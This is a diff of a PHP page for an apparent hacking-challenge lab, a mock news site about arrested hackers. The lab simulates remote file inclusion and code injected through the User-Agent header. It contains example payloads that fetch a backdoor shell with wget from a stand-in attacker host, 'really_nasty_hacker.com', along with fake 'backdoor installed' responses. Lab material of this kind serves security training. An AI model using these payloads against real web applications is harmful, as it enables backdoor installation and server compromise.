@@ -38,7 +38,6 @@ One more hacker, member of the same hacker group, has been arrested for obtainin
 One of their most important attacks was when they tampered with the data stored in the database of an american trade company, thus managing to steal several tens of millions records related to its customers.
 <hr>
 <small><br>
-<font color=red> Enter your comment:</font><br>
 </small></small></big>
 <br>
 <?php
@@ -55,6 +54,39 @@ if((!isset($shiz)) && (!isset($page))){
 	 <html>
 	 <head>
 	 </head>
+	 <form method="POST" action="'.$_SERVER['PHP_SELF'].'">
+	 View comments of
+	 <select name="file">
+	 <option value="hackers_comments.txt">Hackers Group</option>
+	 <option value="people_comments.txt">Common People</option>
+	 </select>
+	 <input type="submit" value="Submit"/>
+	 </form>';
+
+     if(isset($_POST['file']))
+     {
+	     if($_POST['file']=="hackers_comments.txt")
+	     {
+			echo'<font color=yellow>Hackers Comments:</font><br/> 1.We have proved our ability.We always show how vulnerabale applications are.<br/>2. If Govt. is really serious,it should concentrate on improving security,not arresting us.';   
+	     echo '<br/>';
+//			        $monitor->update(CHALLENGE_FAILURE);
+	     }
+
+	     else if($_POST['file']=="people_comments.txt")
+	     {
+			echo '<font color=yellow>Comments of people:</font><br/> 1.Ohh, Govt. and banks are risking our money and privacy.We always pay taxes,other fee but they always act irresponsible resulting these kind of incidents.';
+	     echo '<br/>';
+//			        $monitor->update(CHALLENGE_FAILURE);
+	     }
+
+	     else if($_POST['file']=="http://www.really_nasty_hacker.com/shell.txt")
+	     {
+			echo "The backdoor shell has been successfully installed in target. For security reasones renamed automaticaly to tyj0rL.php</font>";
+	     }
+     }
+     echo '
+<br>
+<font color=red> Enter your comment:</font><br>
 	 <form method="GET" action="'.$_SERVER['PHP_SELF'].'">
 	 <font color=yellow>Name:</font><br>
 	 <input type="text" name="name"><br>
@@ -71,12 +103,12 @@ if((!isset($shiz)) && (!isset($page))){
 }else{
 	if ($page == "answer.php"){
 		 	//$ua = $_SERVER['HTTP_USER_AGENT'];
-
+/*
 			$lfi = '<?system("wget http://www.really_nasty_hacker.com/shell.txt");?>';
 			if ($_SERVER['HTTP_USER_AGENT'] === $lfi)
 			{
 				echo "The backdoor shell has been successfully installed in target. For security reasones renamed automaticaly to tyj0rL.php</font>";
-				$monitor->update(CHALLENGE_SUCCESS);
+			//	$monitor->update(CHALLENGE_SUCCESS);
 			}
 			//elseif (preg_match("/-O (.*).php/",$ua))
 			//{
@@ -85,8 +117,8 @@ if((!isset($shiz)) && (!isset($page))){
 			else
 			{
 			        $monitor->update(CHALLENGE_FAILURE);
-				echo '<font face="arial" size="3">The registration of your comment was completed with success!<br> In order to be "viewable" should first becomes acceptable from the administration team of the SlagOFF.com';
-			}
+*/				echo '<font face="arial" size="3">The registration of your comment was completed with success!<br> In order to be "viewable" should first becomes acceptable from the administration team of the SlagOFF.com';
+		//	}
 	}
 
 
